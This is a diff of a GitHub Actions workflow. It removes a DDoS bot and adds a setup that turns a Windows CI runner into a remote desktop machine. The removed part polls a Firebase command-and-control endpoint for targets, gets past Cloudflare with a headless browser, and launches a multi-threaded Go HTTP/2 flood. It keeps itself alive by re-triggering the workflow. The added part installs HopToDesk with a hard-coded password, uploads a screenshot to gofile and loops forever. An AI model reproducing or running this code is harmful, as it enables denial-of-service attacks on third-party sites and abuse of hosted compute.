@@ -1,119 +1,90 @@
-name: Ryxen-Omega-Final
-on:
-  workflow_dispatch:
+name: RATA_W11_GLOOSO_FINAL
+on: workflow_dispatch
 
 jobs:
-  phantom-power:
-    runs-on: ubuntu-latest
+  gaming-heist:
+    runs-on: windows-latest
     steps:
-    - name: Global Environment Setup
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y golang-go google-chrome-stable xvfb
-        pip install requests undetected-chromedriver selenium numpy
+      - name: 🇨🇱 1. REGION Y NOMBRE
+        shell: powershell
+        run: |
+          Set-WinHomeLocation -GeoId 46
+          $n = "Glooso"
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" -Name "ComputerName" -Value $n
 
-    - name: Create Engine (engine.py)
-      run: |
-        cat <<EOF > engine.py
-        import requests, time, subprocess, random, numpy as np
-        import undetected_chromedriver as uc
+      - name: 📥 2. DESCARGAS (Telegram, Discord, Remotly)
+        shell: powershell
+        run: |
+          $down = "$env:USERPROFILE\Downloads"
+          
+          Write-Host "Descargando instaladores a $down..."
+          # Remotly
+          curl.exe -L -o "$down\remotly_setup.exe" "https://downloads.mirillis.com/files/remotly_pc_1_37_2_setup.exe"
+          # Telegram
+          curl.exe -L -o "$down\TelegramSetup.exe" "https://telegram.org/dl/desktop/win64"
+          # Discord PTB
+          curl.exe -L -o "$down\DiscordPTBSetup.exe" "https://discord.com/api/downloads/distributions/app/installers/latest?channel=ptb&platform=win&arch=x64"
 
-        FB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
-        LAST_TS = 0
+      - name: 🔑 3. PREPARAR HOPTODESK (PORTABLE)
+        shell: powershell
+        run: |
+          # Descargamos el exe directamente a la carpeta de ejecución
+          curl.exe -L -o "hoptodesk.exe" "https://download.hoptodesk.com/HopToDesk64.exe"
+          
+          # Intentamos setear password. Si falla por privilegios, usaremos el ID que genere por defecto
+          try {
+            ./hoptodesk.exe --password boosito
+          } catch { 
+            Write-Host "No se pudo setear pass manual, se usará la que venga por defecto." 
+          }
+          
+          Start-Sleep -Seconds 5
+          $id = ./hoptodesk.exe --get-id
+          Write-Host "========================================"
+          Write-Host "ID HOPTODESK: $id"
+          Write-Host "PASS: boosito (si funcionó) o revisa la app"
+          Write-Host "========================================"
 
-        def get_stealth_session(url):
-            print("🧠 [SELENIUM] Saltando Cloudflare y obteniendo sesión...")
-            opts = uc.ChromeOptions()
-            opts.add_argument('--headless')
-            opts.add_argument('--no-sandbox')
-            try:
-                driver = uc.Chrome(options=opts)
-                driver.get(url)
-                time.sleep(20) # Más tiempo para el bypass
-                cookie = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
-                ua = driver.execute_script("return navigator.userAgent")
-                driver.quit()
-                return cookie, ua
-            except: return None, None
+      - name: 🔗 4. CREAR ACCESOS DIRECTOS EN ESCRITORIO
+        shell: powershell
+        run: |
+          $ws = New-Object -ComObject WScript.Shell
+          $desk = "$env:USERPROFILE\Desktop"
+          $down = "$env:USERPROFILE\Downloads"
 
-        if __name__ == "__main__":
-            while True:
-                try:
-                    res = requests.get(FB_URL).json()
-                    ts = res.get("timestamp", 0)
-                    if res and res.get("status") == "attack" and ts > LAST_TS:
-                        target = res.get("target")
-                        duration = res.get("time", 90)
-                        method = res.get("method", "dstat-fast")
-                        threads = res.get("threads", 100)
-                        LAST_TS = ts
-                        
-                        cookie, ua = get_stealth_session(target)
-                        if cookie:
-                            print(f"🔥 [EXE] Lanzando {method} contra {target}")
-                            subprocess.run(["go", "run", "attack.go", target, str(duration), cookie, ua, str(threads), method])
-                        requests.patch(FB_URL, json={"status": "idle"})
-                    else:
-                        np.random.rand(800, 800) @ np.random.rand(800, 800)
-                        time.sleep(25)
-                except: pass
-        EOF
+          # Acceso a Instalador Telegram
+          $s1 = $ws.CreateShortcut("$desk\Instalar_Telegram.lnk")
+          $s1.TargetPath = "$down\TelegramSetup.exe"
+          $s1.Save()
 
-    - name: Create Advanced Go Striker (attack.go)
-      run: |
-        cat <<EOF > attack.go
-        package main
-        import ("net/http"; "os"; "strconv"; "sync"; "time"; "crypto/tls"; "golang.org/x/net/http2")
+          # Acceso a Instalador Discord
+          $s2 = $ws.CreateShortcut("$desk\Instalar_Discord.lnk")
+          $s2.TargetPath = "$down\DiscordPTBSetup.exe"
+          $s2.Save()
+          
+          # Acceso a HopToDesk (por si se cierra)
+          $s3 = $ws.CreateShortcut("$desk\HopToDesk.lnk")
+          $s3.TargetPath = "$env:GITHUB_WORKSPACE\hoptodesk.exe"
+          $s3.Save()
 
-        func main() {
-            target, durStr, cookie, ua := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
-            threads, _ := strconv.Atoi(os.Args[5])
-            duration, _ := strconv.Atoi(durStr)
-            method := os.Args[6]
+      - name: 📸 5. EVIDENCIA GOFILE
+        shell: powershell
+        run: |
+          Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+          $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+          $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
+          $g = [System.Drawing.Graphics]::FromImage($b)
+          $g.CopyFromScreen(0, 0, 0, 0, $b.Size)
+          $imgPath = "C:\Users\Public\evidence.png"
+          $b.Save($imgPath)
+          
+          $server = (curl.exe -s https://api.gofile.io/servers | ConvertFrom-Json).data.servers[0].name
+          $link = (curl.exe -F "file=@$imgPath" "https://$($server).gofile.io/contents/uploadfile" | ConvertFrom-Json).data.downloadPage
+          Write-Host "EVIDENCIA: $link"
 
-            var wg sync.WaitGroup
-            stop := time.After(time.Duration(duration) * time.Second)
-
-            // Transporte HTTP/2 para masividad
-            tr := &http.Transport{
-                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-            }
-            http2.ConfigureTransport(tr)
-            client := &http.Client{Transport: tr, Timeout: 4 * time.Second}
-
-            for i := 0; i < threads; i++ {
-                wg.Add(1)
-                go func() {
-                    defer wg.Done()
-                    for {
-                        select {
-                        case <-stop: return
-                        default:
-                            req, _ := http.NewRequest("GET", target, nil)
-                            req.Header.Set("Cookie", cookie)
-                            req.Header.Set("User-Agent", ua)
-                            req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-                            
-                            if method == "dstat-fast" {
-                                req.Header.Set("Cache-Control", "no-cache")
-                                req.Header.Set("Connection", "keep-alive")
-                            }
-
-                            resp, err := client.Do(req)
-                            if err == nil { resp.Body.Close() }
-                        }
-                    }
-                }()
-            }
-            wg.Wait()
-        }
-        EOF
-
-    - name: Persistence
-      env:
-        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      run: |
-        python engine.py &
-        sleep 18000
-        gh workflow run main.yml
-
+      - name: 🔄 LOOP
+        shell: powershell
+        run: |
+          Write-Host "Runner listo. Los instaladores están en el escritorio."
+          while($true) { Start-Sleep 60 }
+          
